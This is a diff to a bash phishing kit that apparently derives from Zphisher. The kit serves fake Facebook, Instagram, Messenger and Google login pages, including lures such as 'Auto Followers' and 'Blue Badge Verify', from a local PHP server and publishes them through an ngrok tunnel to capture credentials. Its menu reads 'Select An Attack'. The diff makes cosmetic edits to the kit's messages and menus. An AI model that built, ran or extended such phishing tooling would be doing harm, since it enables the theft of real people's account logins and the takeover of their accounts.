@@ -169,7 +169,6 @@ about() {
 	cat <<- EOF
 		${RED}Author   ${RED}:  ${ORANGE}NIGHTHAWK ${RED}[ ${ORANGE}N16H7H4WK ${RED}]
 		${RED}Github   ${RED}:  ${RED}https://github.com/Nighthawk-N16H7H4WK
-
 		${GREEN}[${GREEN}0${GREEN}]${GREEN} Main Menu     ${GREEN}[${GREEN}9${GREEN}]${RED} Exit
 	EOF
 
@@ -191,10 +190,10 @@ HOST='127.0.0.1'
 PORT='8080'
 
 setup_site() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Setting up..."${WHITE}
+	echo -e ${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting PHP..."${WHITE}
+	echo -ne ${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
 
@@ -242,7 +241,7 @@ capture_data() {
 start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Setting... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Getting link..."
 
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & 
@@ -281,9 +280,7 @@ tunnel_menu() {
 site_facebook() {
 	cat <<- EOF
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook Login Page
-
 		${RED}[${WHITE}02${RED}]${ORANGE} Voting Poll Login Page
-
 		${RED}[${WHITE}03${RED}]${ORANGE} Messenger Login Page
 	EOF
 
@@ -311,9 +308,7 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-
 		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-
 		${RED}[${WHITE}03${RED}]${ORANGE} Blue Badge Verify Login Page
 	EOF
 
@@ -369,9 +364,7 @@ main_menu() {
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack ${RED}[${WHITE}::${RED}]${ORANGE}
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook     ${RED}[${WHITE}02${RED}]${ORANGE} Instagram  
-
 ${RED}[${WHITE}03${RED}]${ORANGE} Google   
-
 		${RED}[${WHITE}9${RED}]${ORANGE} About         ${RED}[${WHITE}0${RED}]${RED} Exit
 	EOF
 	
